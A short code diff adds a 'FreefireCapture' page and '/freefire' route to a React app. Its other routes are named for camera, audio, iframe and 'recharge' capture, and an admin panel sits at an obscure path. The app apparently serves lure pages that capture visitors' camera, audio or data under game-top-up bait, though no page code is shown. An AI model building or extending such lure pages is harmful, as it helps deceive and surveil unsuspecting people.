@@ -12,6 +12,7 @@ import CustomCapture from "./pages/CustomCapture";
 import ChromeCustomCapture from "./pages/ChromeCustomCapture";
 import IframeCapture from "./pages/IframeCapture";
 import RechargeCapture from "./pages/RechargeCapture";
+import FreefireCapture from "./pages/FreefireCapture";
 import VideoCapture from "./pages/VideoCapture";
 import AudioCapture from "./pages/AudioCapture";
 import Admin from "./pages/Admin";
@@ -39,6 +40,7 @@ const App = () => (
               <Route path="/chrome-custom-capture" element={<ChromeCustomCapture />} />
               <Route path="/iframe-capture" element={<IframeCapture />} />
               <Route path="/recharge" element={<RechargeCapture />} />
+              <Route path="/freefire" element={<FreefireCapture />} />
               <Route path="/video-capture" element={<VideoCapture />} />
               <Route path="/audio-capture" element={<AudioCapture />} />
               <Route path="/chaudhary99" element={<Admin />} />
